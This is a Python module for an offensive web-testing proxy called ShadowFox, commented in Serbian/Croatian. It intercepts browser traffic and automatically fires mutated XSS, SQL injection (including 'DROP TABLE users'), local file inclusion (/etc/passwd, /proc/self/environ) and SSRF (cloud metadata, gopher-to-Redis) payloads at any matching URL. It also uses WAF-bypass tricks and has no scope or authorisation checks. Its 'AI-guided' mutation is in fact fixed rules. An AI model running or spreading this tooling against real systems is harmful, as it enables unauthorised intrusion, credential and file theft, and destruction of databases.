# shadowfox/core/shadow_proxy_master.py

import asyncio
import aiohttp
import websockets
import json
import threading
import time
import re
import base64
import urllib.parse
from typing import Dict, List, Any, Optional, Callable
from datetime import datetime
import logging
import ssl
from urllib.parse import urlparse, parse_qs, urlencode
import hashlib
import random
from concurrent.futures import ThreadPoolExecutor
import queue
import weakref

class AIPayloadMutator:
    """
    AI-driven payload mutation engine
    Adaptivno mutira payload-e na osnovu response-a
    """
    
    def __init__(self):
        self.mutation_history = {}
        self.success_patterns = {}
        self.logger = logging.getLogger('AIPayloadMutator')
        
        # Osnovni mutation pravila
        self.xss_mutations = [
            lambda p: p.replace('<', '&lt;').replace('>', '&gt;'),
            lambda p: p.replace('"', '&quot;').replace("'", '&#x27;'),
            lambda p: f"javascript:{p}",
            lambda p: f"data:text/html,{p}",
            lambda p: f"/*{p}*/",
            lambda p: f"{p}<!--",
            lambda p: f"<svg onload={p}>",
            lambda p: f"<img src=x onerror={p}>",
            lambda p: f"<script>{p}</script>",
            lambda p: f"';{p};//",
            lambda p: f'";{p};//',
            lambda p: f"${{{p}}}",  # Template injection
            lambda p: f"{{{{7*7}}}}{p}",  # SSTI
            lambda p: base64.b64encode(p.encode()).decode(),
            lambda p: urllib.parse.quote(p),
            lambda p: urllib.parse.quote_plus(p),
        ]
        
        self.sqli_mutations = [
            lambda p: f"' OR '1'='1",
            lambda p: f"' UNION SELECT NULL--",
            lambda p: f"'; DROP TABLE users--",
            lambda p: f"' AND SLEEP(5)--",
            lambda p: f"' OR 1=1#",
            lambda p: f"admin'--",
            lambda p: f"' OR 'x'='x",
            lambda p: f"1; SELECT * FROM information_schema.tables--",
            lambda p: f"' UNION ALL SELECT 1,2,3,4,5--",
            lambda p: f"' AND (SELECT COUNT(*) FROM sysobjects)>0--",
            lambda p: f"'; WAITFOR DELAY '0:0:5'--",
            lambda p: f"' OR BENCHMARK(5000000,MD5(1))--",
            lambda p: f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
        ]
        
        self.lfi_mutations = [
            lambda p: f"../../../etc/passwd",
            lambda p: f"....//....//....//etc/passwd",
            lambda p: f"/etc/passwd%00",
            lambda p: f"php://filter/read=convert.base64-encode/resource=index.php",
            lambda p: f"php://input",
            lambda p: f"data://text/plain,{p}",
            lambda p: f"file:///etc/passwd",
            lambda p: f"C:\\Windows\\System32\\drivers\\etc\\hosts",
            lambda p: f"/proc/self/environ",
            lambda p: f"/var/log/apache2/access.log",
        ]
        
        self.ssrf_mutations = [
            lambda p: f"http://localhost:8080/{p}",
            lambda p: f"http://127.0.0.1:22/{p}",
            lambda p: f"http://169.254.169.254/latest/meta-data/",
            lambda p: f"file:///etc/passwd",
            lambda p: f"gopher://127.0.0.1:6379/_",
            lambda p: f"http://localhost/admin",
            lambda p: f"https://httpbin.org/get?url={p}",
        ]
    
    def mutate_payload(self, payload: str, attack_type: str, response_context: Dict = None) -> List[str]:
        """
        Generiše mutirane verzije payload-a na osnovu tipa napada i konteksta
        """
        mutations = []
        
        # Izaberi odgovarajuće mutation funkcije
        if attack_type.lower() == 'xss':
            mutation_funcs = self.xss_mutations
        elif attack_type.lower() in ['sqli', 'sql']:
            mutation_funcs = self.sqli_mutations
        elif attack_type.lower() == 'lfi':
            mutation_funcs = self.lfi_mutations
        elif attack_type.lower() == 'ssrf':
            mutation_funcs = self.ssrf_mutations
        else:
            mutation_funcs = self.xss_mutations  # Default
        
        # Generiši mutacije
        for func in mutation_funcs:
            try:
                mutated = func(payload)
                if mutated not in mutations:
                    mutations.append(mutated)
            except Exception as e:
                self.logger.warning(f"Mutation failed: {e}")
        
        # AI-guided mutations na osnovu response konteksta
        if response_context:
            mutations.extend(self._ai_guided_mutations(payload, response_context, attack_type))
        
        return mutations[:15]  # Ograniči na 15 najboljih
    
    def _ai_guided_mutations(self, payload: str, response_context: Dict, attack_type: str) -> List[str]:
        """
        AI-vođene mutacije na osnovu response karakteristika
        """
        mutations = []
        
        # Analiza response-a
        content = response_context.get('content', '').lower()
        headers = response_context.get('headers', {})
        status_code = response_context.get('status_code', 200)
        
        # Ako je WAF detektovan, pokušaj bypass
        if any(waf in content for waf in ['blocked', 'forbidden', 'security', 'firewall']):
            mutations.extend(self._waf_bypass_mutations(payload))
        
        # Ako je PHP aplikacija
        if 'php' in content or 'x-powered-by' in str(headers).lower():
            if attack_type.lower() == 'xss':
                mutations.extend([
                    f"<?php echo '{payload}'; ?>",
                    f"<script>/*<?php echo 'XSS'; ?>*/{payload}</script>",
                ])
        
        # Ako je detected framework
        if 'laravel' in content:
            mutations.append(f"{{{{ {payload} }}}}")
        if 'django' in content:
            mutations.append(f"{{{{ {payload} }}}}")
        
        return mutations
    
    def _waf_bypass_mutations(self, payload: str) -> List[str]:
        """
        Specijalne mutacije za bypass WAF-a
        """
        return [
            payload.replace(' ', '/**/'),
            payload.replace('=', '/**/=/**/'),
            payload.replace('(', '/**/(/**/'),
            payload.replace(')', '/**/)/**/'),
            ''.join([c + '/**/' if c.isalnum() else c for c in payload]),
            payload.upper(),
            payload.lower(),
            re.sub(r'(\w)', r'\1/**/', payload),
        ]

class ProxyInterceptor:
    """
    Presreće i modifikuje HTTP/HTTPS/WebSocket saobraćaj
    """
    
    def __init__(self, ai_mutator, dashboard_callback=None):
        self.ai_mutator = ai_mutator
        self.dashboard_callback = dashboard_callback
        self.logger = logging.getLogger('ProxyInterceptor')
        self.active_sessions = {}
        self.injection_rules = {}
        self.mutation_queue = queue.Queue()
        
    def add_injection_rule(self, rule_id: str, pattern: str, payload: str, attack_type: str):
        """
        Dodaje pravilo za automatsko ubacivanje payload-a
        """
        self.injection_rules[rule_id] = {
            'pattern': re.compile(pattern),
            'payload': payload,
            'attack_type': attack_type,
            'hits': 0,
            'created_at': datetime.now()
        }
        self.logger.info(f"Dodano injection pravilo: {rule_id}")
    
    async def intercept_http_request(self, method: str, url: str, headers: Dict, 
                                   body: bytes = None) -> Dict[str, Any]:
        """
        Presreće HTTP zahtev i ubacuje payload-e
        """
        parsed_url = urlparse(url)
        
        # Check injection rules
        for rule_id, rule in self.injection_rules.items():
            if rule['pattern'].search(url):
                # Inject payload
                injected_requests = await self._inject_payloads(
                    method, url, headers, body, rule['payload'], rule['attack_type']
                )
                
                rule['hits'] += 1
                
                # Execute injected requests
                for req in injected_requests:
                    response = await self._execute_request(req)
                    await self._analyze_response(req, response, rule['attack_type'])
                
                return {'injected': True, 'rule_id': rule_id, 'requests': len(injected_requests)}
        
        return {'injected': False}
    
    async def _inject_payloads(self, method: str, url: str, headers: Dict, 
                             body: bytes, base_payload: str, attack_type: str) -> List[Dict]:
        """
        Generiše i ubacuje payload-e u različite delove zahteva
        """
        injected_requests = []
        
        # Generiši mutacije
        mutations = self.ai_mutator.mutate_payload(base_payload, attack_type)
        
        parsed_url = urlparse(url)
        
        for payload in mutations:
            # URL parameter injection
            if parsed_url.query:
                params = parse_qs(parsed_url.query)
                for param_name in params:
                    new_params = params.copy()
                    new_params[param_name] = [payload]
                    new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(new_params, doseq=True)}"
                    
                    injected_requests.append({
                        'method': method,
                        'url': new_url,
                        'headers': headers,
                        'body': body,
                        'injection_point': f'url_param_{param_name}',
                        'payload': payload
                    })
            
            # Header injection
            for header_name in ['User-Agent', 'Referer', 'X-Forwarded-For']:
                if header_name in headers:
                    new_headers = headers.copy()
                    new_headers[header_name] = payload
                    
                    injected_requests.append({
                        'method': method,
                        'url': url,
                        'headers': new_headers,
                        'body': body,
                        'injection_point': f'header_{header_name}',
                        'payload': payload
                    })
            
            # Body injection (POST data)
            if method.upper() in ['POST', 'PUT', 'PATCH'] and body:
                try:
                    # JSON body
                    if headers.get('Content-Type', '').startswith('application/json'):
                        json_data = json.loads(body.decode())
                        for key in json_data:
                            new_json = json_data.copy()
                            new_json[key] = payload
                            
                            injected_requests.append({
                                'method': method,
                                'url': url,
                                'headers': headers,
                                'body': json.dumps(new_json).encode(),
                                'injection_point': f'json_{key}',
                                'payload': payload
                            })
                    
                    # Form data
                    elif headers.get('Content-Type', '').startswith('application/x-www-form-urlencoded'):
                        form_data = parse_qs(body.decode())
                        for param_name in form_data:
                            new_form = form_data.copy()
                            new_form[param_name] = [payload]
                            
                            injected_requests.append({
                                'method': method,
                                'url': url,
                                'headers': headers,
                                'body': urlencode(new_form, doseq=True).encode(),
                                'injection_point': f'form_{param_name}',
                                'payload': payload
                            })
                            
                except Exception as e:
                    self.logger.warning(f"Body injection failed: {e}")
        
        return injected_requests
    
    async def _execute_request(self, request_data: Dict) -> Dict:
        """
        Izvršava HTTP zahtev
        """
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.request(
                    method=request_data['method'],
                    url=request_data['url'],
                    headers=request_data['headers'],
                    data=request_data.get('body')
                ) as response:
                    content = await response.text()
                    
                    return {
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'content': content,
                        'url': str(response.url),
                        'request_data': request_data
                    }
        except Exception as e:
            return {
                'error': str(e),
                'request_data': request_data
            }
    
    async def _analyze_response(self, request_data: Dict, response: Dict, attack_type: str):
        """
        Analizira response i detektuje potencijalne ranjivosti
        """
        if 'error' in response:
            return
        
        payload = request_data['payload']
        content = response.get('content', '')
        status_code = response.get('status_code', 0)
        
        # Detektuj potencijalne hitove
        potential_hit = False
        confidence = 0.0
        
        if attack_type.lower() == 'xss':
            if payload in content and '<script>' in payload:
                potential_hit = True
                confidence = 0.9
            elif payload in content:
                potential_hit = True
                confidence = 0.6
        
        elif attack_type.lower() in ['sqli', 'sql']:
            sql_errors = ['mysql', 'ora-', 'postgresql', 'sqlite', 'mssql']
            if any(error in content.lower() for error in sql_errors):
                potential_hit = True
                confidence = 0.8
            elif status_code == 500:
                potential_hit = True
                confidence = 0.4
        
        elif attack_type.lower() == 'lfi':
            if 'root:x:0:0' in content or 'bin/bash' in content:
                potential_hit = True
                confidence = 0.95
        
        if potential_hit:
            finding = {
                'timestamp': datetime.now().isoformat(),
                'attack_type': attack_type,
                'payload': payload,
                'injection_point': request_data['injection_point'],
                'url': response['url'],
                'status_code': status_code,
                'confidence': confidence,
                'response_snippet': content[:500],
                'request_data': request_data
            }
            
            # Pošalji na dashboard
            if self.dashboard_callback:
                await self.dashboard_callback(finding)
            
            self.logger.info(f"Potential {attack_type} found: {confidence:.2f} confidence")

class ShadowProxyMaster:
    """
    Glavni proxy server sa AI mutation engine i live dashboard
    """
    
    def __init__(self, operator, port=8888):
        self.operator = operator
        self.port = port
        self.logger = logging.getLogger('ShadowProxyMaster')
        
        # Components
        self.ai_mutator = AIPayloadMutator()
        self.interceptor = ProxyInterceptor(self.ai_mutator, self._dashboard_callback)
        
        # Server states
        self.running = False
        self.connections = weakref.WeakSet()
        self.stats = {
            'requests_intercepted': 0,
            'payloads_injected': 0,
            'potential_findings': 0,
            'start_time': None
        }
        
        # WebSocket clients for live dashboard
        self.dashboard_clients = set()
    
    async def start_proxy_server(self):
        """
        Pokreće proxy server
        """
        self.running = True
        self.stats['start_time'] = datetime.now()
        
        # HTTP/HTTPS Proxy server
        proxy_server = await asyncio.start_server(
            self._handle_connection, 
            '127.0.0.1', 
            self.port
        )
        
        # WebSocket server za dashboard
        dashboard_server = await websockets.serve(
            self._handle_dashboard_connection,
            '127.0.0.1',
            self.port + 1
        )
        
        self.logger.info(f"ShadowProxy started on port {self.port}")
        self.logger.info(f"Dashboard WebSocket on port {self.port + 1}")
        
        try:
            # Pokreni oba servera
            await asyncio.gather(
                proxy_server.serve_forever(),
                dashboard_server.wait_closed()
            )
        except Exception as e:
            self.logger.error(f"Proxy server error: {e}")
        finally:
            self.running = False
    
    async def _handle_connection(self, reader, writer):
        """
        Rukuje HTTP/HTTPS konekcijama kroz proxy
        """
        try:
            # Čitaj HTTP zahtev
            request_data = await self._parse_http_request(reader)
            if not request_data:
                writer.close()
                return
            
            self.stats['requests_intercepted'] += 1
            
            # Interceptor logic
            intercept_result = await self.interceptor.intercept_http_request(
                request_data['method'],
                request_data['url'],
                request_data['headers'],
                request_data.get('body')
            )
            
            if intercept_result['injected']:
                self.stats['payloads_injected'] += len(intercept_result.get('requests', []))
            
            # Prosledi originalni zahtev
            response = await self._forward_request(request_data)
            
            # Pošalji response nazad
            await self._send_http_response(writer, response)
            
        except Exception as e:
            self.logger.error(f"Connection handling error: {e}")
        finally:
            writer.close()
    
    async def _parse_http_request(self, reader) -> Dict:
        """
        Parsira HTTP zahtev
        """
        try:
            # Čitaj request liniju
            request_line = await reader.readline()
            if not request_line:
                return None
            
            method, url, version = request_line.decode().strip().split()
            
            # Čitaj headers
            headers = {}
            while True:
                line = await reader.readline()
                if line == b'\r\n':
                    break
                
                header_line = line.decode().strip()
                if ':' in header_line:
                    key, value = header_line.split(':', 1)
                    headers[key.strip()] = value.strip()
            
            # Čitaj body ako postoji
            body = None
            if 'Content-Length' in headers:
                content_length = int(headers['Content-Length'])
                body = await reader.read(content_length)
            
            return {
                'method': method,
                'url': url,
                'version': version,
                'headers': headers,
                'body': body
            }
            
        except Exception as e:
            self.logger.error(f"Request parsing error: {e}")
            return None
    
    async def _forward_request(self, request_data: Dict) -> Dict:
        """
        Prosleđuje zahtev dalje i vraća response
        """
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.request(
                    method=request_data['method'],
                    url=request_data['url'],
                    headers=request_data['headers'],
                    data=request_data.get('body')
                ) as response:
                    content = await response.read()
                    
                    return {
                        'status_code': response.status,
                        'headers': dict(response.headers),
                        'content': content,
                        'version': 'HTTP/1.1'
                    }
        except Exception as e:
            return {
                'status_code': 500,
                'headers': {'Content-Type': 'text/plain'},
                'content': f"Proxy Error: {str(e)}".encode(),
                'version': 'HTTP/1.1'
            }
    
    async def _send_http_response(self, writer, response: Dict):
        """
        Šalje HTTP response
        """
        try:
            # Status line
            status_line = f"{response['version']} {response['status_code']} OK\r\n"
            writer.write(status_line.encode())
            
            # Headers
            for key, value in response['headers'].items():
                writer.write(f"{key}: {value}\r\n".encode())
            
            writer.write(b'\r\n')
            
            # Body
            if 'content' in response:
                writer.write(response['content'])
            
            await writer.drain()
            
        except Exception as e:
            self.logger.error(f"Response sending error: {e}")
    
    async def _handle_dashboard_connection(self, websocket, path):
        """
        Rukuje WebSocket konekcijama za live dashboard
        """
        self.dashboard_clients.add(websocket)
        self.logger.info("Dashboard client connected")
        
        try:
            # Pošalji trenutne stats
            await websocket.send(json.dumps({
                'type': 'stats',
                'data': self.stats
            }))
            
            # Čekaj poruke (ako klijent šalje komande)
            async for message in websocket:
                try:
                    data = json.loads(message)
                    await self._handle_dashboard_command(websocket, data)
                except json.JSONDecodeError:
                    pass
                    
        except websockets.exceptions.ConnectionClosed:
            pass
        finally:
            self.dashboard_clients.discard(websocket)
            self.logger.info("Dashboard client disconnected")
    
    async def _handle_dashboard_command(self, websocket, command: Dict):
        """
        Rukuje komandama sa dashboard-a
        """
        cmd_type = command.get('type')
        
        if cmd_type == 'add_injection_rule':
            rule_data = command.get('data', {})
            self.interceptor.add_injection_rule(
                rule_data.get('rule_id'),
                rule_data.get('pattern'),
                rule_data.get('payload'),
                rule_data.get('attack_type')
            )
            
            await websocket.send(json.dumps({
                'type': 'rule_added',
                'status': 'success'
            }))
        
        elif cmd_type == 'get_stats':
            await websocket.send(json.dumps({
                'type': 'stats',
                'data': self.stats
            }))
    
    async def _dashboard_callback(self, finding: Dict):
        """
        Callback za slanje findings na dashboard
        """
        self.stats['potential_findings'] += 1
        
        message = {
            'type': 'finding',
            'data': finding
        }
        
        # Pošalji svim povezanim dashboard klijentima
        disconnected = set()
        for client in self.dashboard_clients:
            try:
                await client.send(json.dumps(message))
            except websockets.exceptions.ConnectionClosed:
                disconnected.add(client)
        
        # Ukloni disconnected klijente
        self.dashboard_clients -= disconnected
    
    def add_injection_rule(self, rule_id: str, pattern: str, payload: str, attack_type: str):
        """
        Javni interface za dodavanje injection pravila
        """
        self.interceptor.add_injection_rule(rule_id, pattern, payload, attack_type)
    
    def get_stats(self) -> Dict:
        """
        Vraća trenutne statistike
        """
        if self.stats['start_time']:
            runtime = datetime.now() - self.stats['start_time']
            self.stats['runtime_seconds'] = runtime.total_seconds()
        
        return self.stats.copy()

# Test i demo
async def demo_shadowproxy():
    """
    Demo funkcija za testiranje
    """
    from shadowfox.core.operator import ShadowFoxOperator
    
    # Setup
    operator = ShadowFoxOperator()
    proxy = ShadowProxyMaster(operator, port=8888)
    
    # Dodaj neka test pravila
    proxy.add_injection_rule(
        'xss_test_1',
        r'.*search.*',
        '<script>alert("XSS")</script>',
        'xss'
    )
    
    proxy.add_injection_rule(
        'sqli_test_1', 
        r'.*login.*',
        "' OR 1=1--",
        'sqli'
    )
    
    print("ShadowProxyMaster Demo - konfiguriši browser proxy na 127.0.0.1:8888")
    print("Dashboard WebSocket: ws://127.0.0.1:8889")
    
    # Pokreni proxy
    await proxy.start_proxy_server()

if __name__ == "__main__":
    asyncio.run(demo_shadowproxy())
